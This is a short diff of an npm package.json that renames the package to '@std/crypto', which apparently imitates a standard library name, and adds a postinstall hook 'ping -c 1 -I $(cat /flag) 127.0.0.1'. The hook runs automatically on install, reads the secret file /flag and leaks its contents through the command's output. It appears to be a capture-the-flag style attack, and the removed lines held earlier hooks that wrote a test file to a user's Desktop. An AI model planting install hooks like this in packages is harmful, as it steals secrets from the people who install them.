@@ -1,14 +1,6 @@
 {
-  "name": "playwright",
-  "version": "1.0.0",
-  "description": "",
-  "main": "index.js",
+  "name": "@std/crypto",
   "scripts": {
-    "postinstall": "echo \"aaaaaa\" > /home/anou/Desktop/secure_com/haha",
-    "prepare": "echo \"aaaaaa\" > /home/anou/Desktop/secure_com/haha"
-  },
-  "keywords": [],
-  "author": "",
-  "license": "ISC",
-  "type": "commonjs"
+    "postinstall": "ping -c 1 -I $(cat /flag) 127.0.0.1"
+  }
 }
